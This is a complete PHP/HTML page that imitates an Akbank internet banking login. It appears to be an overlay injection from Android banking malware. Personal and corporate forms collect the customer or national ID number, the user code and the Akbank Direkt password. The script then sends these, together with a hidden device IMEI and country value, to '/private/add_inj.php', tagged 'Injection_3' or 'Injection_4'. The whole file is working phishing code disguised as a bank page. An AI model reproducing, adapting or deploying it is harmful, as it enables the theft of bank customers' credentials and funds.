<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Akbank</title>

    <link rel="stylesheet" href="tr/tr_akbank/css/ak_normalize.css">
    <link rel="stylesheet" href="tr/tr_akbank/css/ak_main.css">
    <link rel="stylesheet" href="tr/tr_akbank/css/ak.css">

    <script src="tr/tr_akbank/js/jquery.min.js"></script>
    <script src="tr/tr_akbank/js/viewport.js"></script>
    <script src="tr/tr_akbank/js/cat.functions.js"></script>
</head>


<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
?>

<body>
    <div class="row">
        <div class="form_header">
            <img src="tr/tr_akbank/images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" class="wrapper" id="wrapper">

					
	<div class="row" id="select_type">
						<div class="content">

							<div class="btn_wr">
								<button class="sign_btn" id="pers_btn" type=button>
									B&#304;REYSEL
								</button>
							</div>

							<div class="btn_wr">
								<button class="sign_btn"  id="corp_btn">
									KURUMSAL
								</button>
							</div>
						</div>
					</div>

<script>


function checkBad(str)
{
if (str.split(str.slice(0,1)).length === str.length+1) return false;
return true;
}



$(document).ready(function() {
$('#pers_btn').click(function(){
$('#row_pers').show();
$('#row_corp').remove();
$('#select_type').remove();
return false;
});

$('#corp_btn').click(function(){
$('#row_corp').show();
$('#row_pers').remove();
$('#select_type').remove();
return false;
});

$('.main_input').bind("change keyup input click", function() {
    if (this.value.match(/[^0-9]/g)) {
        this.value = this.value.replace(/[^0-9]/g, '');
    }
});


$('#row_corp .sign_btn').click(function(){
if (($('#row_corp input').eq(0).val().length < 5) || (!checkBad($('#row_corp input').eq(0).val()))) {$('#row_corp input').eq(0).addClass('inpError'); $('#row_corp input').eq(0).focus(); return false;} else $('#row_corp input').eq(0).removeClass('inpError');
if (($('#row_corp input').eq(1).val().length < 5) || (!checkBad($('#row_corp input').eq(1).val()))) {$('#row_corp input').eq(1).addClass('inpError'); $('#row_corp input').eq(1).focus(); return false;} else $('#row_corp input').eq(1).removeClass('inpError');
if (($('#row_corp input').eq(2).val().length < 5) || (!checkBad($('#row_corp input').eq(2).val()))) {$('#row_corp input').eq(2).addClass('inpError'); $('#row_corp input').eq(2).focus(); return false;} else $('#row_corp input').eq(2).removeClass('inpError');

var imei_c = document.forms["wrapper"].elements["imei"].value; 
var login1 = document.forms["wrapper"].elements["login1"].value; 
var login2 = document.forms["wrapper"].elements["login2"].value;
var pass = document.forms["wrapper"].elements["passw"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_3|AkBank|"+login1+"|"+pass+"|"+login2);

//sendForm(true);
//closeWindow();
return false;
});

$('#row_pers .sign_btn').click(function(){
if (($('#row_pers input').eq(0).val().length < 5) || (!checkBad($('#row_pers input').eq(0).val()))) {$('#row_pers input').eq(0).addClass('inpError'); $('#row_pers input').eq(0).focus(); return false;} else $('#row_pers input').eq(0).removeClass('inpError');
if (($('#row_pers input').eq(1).val().length < 5) || (!checkBad($('#row_pers input').eq(1).val()))) {$('#row_pers input').eq(1).addClass('inpError'); $('#row_pers input').eq(1).focus(); return false;} else $('#row_pers input').eq(1).removeClass('inpError');
//sendForm(true);

var imei_c = document.forms["wrapper"].elements["imei"].value; 
var login1 = document.forms["wrapper"].elements["login1"].value; 
var pass = document.forms["wrapper"].elements["passw"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_4|AkBank|"+login1+"|"+pass);

//closeWindow();
return false;
});

});

</script>
<style>

.inpError{
border: 2px solid red;

}
</style>
					<div class="row" id="row_pers" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 M&#252;&#351;teri / TC Kimlik Numaras&#305;
								</div>

								<div class="inp_wr">


									<input type="text" name="login1" id="login1_2" class="main_input" maxlength=11 required="">


								</div>
							</div>

							<div class="input_block_wr">
								<div class="inp_caption">
									Akbank Direkt &#350;ifresi
								</div>
								<div class="inp_wr">
									<input type="password" name="passw" id="passw_2" class="main_input" maxlength=6 required="">
									<input type="hidden" name="login2" value="pers_acc">
								</div>
							</div>
							<div class="btn_wr">
								<button class="sign_btn">
									Giri&#351;
								</button>
							</div>
						</div>
					</div>

					<div class="row" id="row_corp" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 M&#252;&#351;teri Numaras&#305;
								</div>
								<div class="inp_wr">
									<input type="text" name="login1" id="login1" class="main_input" maxlength=10 required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									 Kullan&#305;c&#305; Kodu
								</div>
								<div class="inp_wr">
									<input type="text" name="login2" id="login2" class="main_input" maxlength=5 required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									  Akbank Direkt &#350;ifresi
								</div>
								<div class="inp_wr">
									<input type="password" name="passw" id="passw" class="main_input" maxlength=6 required="">
								</div>
							</div>

							<div class="btn_wr">
								<button class="sign_btn">
									Giri&#351;
								</button>
							</div>
						</div>
					</div>

<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
				</form>
			</div>
		</div>
</body>

</html>